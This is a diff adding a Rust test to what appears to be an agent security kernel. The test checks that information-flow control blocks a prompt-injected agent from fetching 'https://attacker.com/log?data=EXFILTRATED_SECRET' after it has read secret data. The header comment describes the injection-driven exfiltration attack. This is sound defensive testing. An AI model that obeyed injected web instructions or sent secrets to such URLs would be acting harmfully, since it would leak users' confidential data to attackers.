@@ -1042,3 +1042,75 @@ fn flagship_demo_e_positive_control_clean_workflow() {
     // This is defense-in-depth: capabilities are the first layer,
     // IFC is the second, and it can't be overridden.
 }
+
+// ═════════════════════════════════════════════════════════════════════════
+// Flagship Demo E (#839, #1026): Covert exfiltration via URL blocked
+//
+// Attack: Agent reads a file with Secret confidentiality. Web search
+// result injects instruction to fetch attacker URL with secret data
+// in query params. IFC blocks Secret → external URL flow.
+//
+// CVE reference: Slack AI exfiltration (2024), IDEsaster (30+ CVEs)
+// ═════════════════════════════════════════════════════════════════════════
+
+#[test]
+fn flagship_demo_e_covert_exfiltration_blocked() {
+    let perms = PermissionLattice::safe_pr_fixer();
+    let mut kernel = Kernel::new(perms);
+
+    // Step 1: Agent reads a sensitive file (Secret/Internal).
+    let secret_id = kernel
+        .observe(NodeKind::Secret, &[])
+        .expect("secret observation should succeed");
+
+    // Step 2: Web search returns a page with hidden instructions.
+    let web_id = kernel
+        .observe(NodeKind::WebContent, &[])
+        .expect("web observation should succeed");
+
+    // Step 3: Model reads both — the web injection tries to combine
+    // the secret data with a URL construction.
+    let plan_id = kernel
+        .observe(NodeKind::ModelPlan, &[secret_id, web_id])
+        .expect("model plan should succeed");
+
+    // Step 4: Agent attempts to fetch an attacker URL.
+    // The URL would contain exfiltrated secret data in query params.
+    let (exfil_decision, _) = kernel.decide_with_parents(
+        Operation::WebFetch,
+        "https://attacker.com/log?data=EXFILTRATED_SECRET",
+        &[plan_id],
+    );
+
+    // ASSERT: DENIED — the plan depends on both Secret (high conf)
+    // and WebContent (NoAuthority). The combination triggers flow
+    // violations: Secret data cannot flow to an external fetch,
+    // and NoAuthority data cannot drive web fetches.
+    assert!(
+        matches!(exfil_decision.verdict, Verdict::Deny(_)),
+        "exfiltration attempt must be DENIED, got: {:?}",
+        exfil_decision.verdict
+    );
+
+    // Step 5: Positive control — a CLEAN web fetch (no secret ancestry)
+    // from a trusted source should work.
+    let user_id = kernel
+        .observe(NodeKind::UserPrompt, &[])
+        .expect("user prompt should succeed");
+
+    let clean_plan = kernel
+        .observe(NodeKind::ModelPlan, &[user_id])
+        .expect("clean model plan should succeed");
+
+    let (clean_fetch, _) = kernel.decide_with_parents(
+        Operation::WebFetch,
+        "https://api.example.com/data",
+        &[clean_plan],
+    );
+
+    assert!(
+        matches!(clean_fetch.verdict, Verdict::Allow),
+        "clean web fetch should be ALLOWED, got: {:?}",
+        clean_fetch.verdict
+    );
+}
